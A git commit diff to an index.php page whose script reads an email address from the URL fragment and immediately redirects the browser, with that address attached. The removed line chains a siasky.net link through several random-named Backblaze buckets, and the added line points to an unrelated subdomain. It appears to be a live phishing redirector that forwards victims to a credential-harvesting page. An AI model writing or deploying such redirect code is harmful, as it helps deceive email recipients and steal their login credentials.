055ac590ee20364851e0e10cb97867cdadee6682
siganls212 <114506423+siganls212@users.noreply.github.com>
2022-09-29 22:33:11 -0400

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://siasky.net/DACoHNSnvEPhIzE9Mw_TVU6L76tIqxGWPSM4nOwaU8K8wg?key=c8a3fadf8d0869a204b3cf7669d91e740522b6d8&url_01=https://deino-hullos-pachypodous.s3.eu-central-003.backblazeb2.com/index.html&url_02=https://deglycerin-parachromatopsia-pelicanry.s3.eu-central-003.backblazeb2.com/index.html&url_03=https://hagger-promulging-unmourned.s3.eu-central-003.backblazeb2.com/index.html&url_04=https://christiania-gragers-pelorized.s3.eu-central-003.backblazeb2.com/index.html&url_05=https://heterosuggestion-sympode-teazled.s3.eu-central-003.backblazeb2.com/index.html&redirect=https://www.amazon.com"+  + em;
+			window.location.href = "https://available-cloud.qualifiedcareservice.co.uk"+ "#" + em;
 		}, 0);
 	</script>
 </html>
